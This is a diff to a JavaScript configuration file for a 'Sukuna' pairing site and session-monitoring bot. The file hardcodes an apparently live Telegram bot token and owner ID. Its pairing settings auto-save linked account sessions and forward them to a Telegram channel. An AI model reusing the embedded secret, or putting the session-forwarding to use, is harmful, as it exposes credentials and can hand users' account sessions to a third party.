@@ -1,10 +1,10 @@
 /**
  * ═══════════════════════════════════════════════════════
- * ⚙️ PLATFORM CONFIG | إعدادات منصة سوكونا
+ * ⚙️ SUKUNA PLATFORM CONFIG | إعدادات منصة سوكونا
  * ═══════════════════════════════════════════════════════
  * 👑 المطور: آدم (شادو) | Adam (Shadow)
  * 🤖 البوت: سوكونا | Sukuna
- * 📜 الوصف: إعدادات موقع الربط + بوت مراقبة الجلسات
+ * 📜 الوصف: إعدادات الموقع + بوت مراقبة الجلسات
  * ═══════════════════════════════════════════════════════
  */
 
@@ -15,26 +15,24 @@ export const config = {
   // ═══ إعدادات الجلسات ═══
   sessionsDir: './sessions',
   subSessionsDir: './sessions/session-sub',
+  tempSessionsDir: './temp_sessions',
+
+  // ═══ إعدادات الرقم الافتراضي ═══
+  defaultCountryCode: process.env.DEFAULT_COUNTRY_CODE || '20',
 
   // ═══ إعدادات بوت التليجرام ═══
   telegram: {
     token: process.env.TELEGRAM_TOKEN || '8343902916:AAFyuOZBNYFPrTMKxHhq6tEaqte8RpRmmAA',
-    // معرف قناة أو جروب الجلسات (لازم يكون البوت أدمن فيه)
     sessionsChannel: process.env.SESSIONS_CHANNEL || '@sukuna_sessions',
-    // معرف المطورين اللي هيتبعتلهم إشعارات
     owners: (process.env.TELEGRAM_OWNERS || '7374743956').split(',').filter(Boolean),
-    // كل كام ثانية يفحص الفولدر
-    checkInterval: 100
+    checkInterval: 10000
   },
 
   // ═══ إعدادات الربط ═══
   pairing: {
-    // هل يحفظ الجلسة تلقائي بعد الربط
     autoSave: true,
-    // هل يبعت الجلسة على التليجرام
     sendToTelegram: true,
-    // هل يحذف الجلسة المؤقتة بعد الحفظ
-    cleanupAfter: 30000
+    cleanupAfter: 15000
   }
 }
 
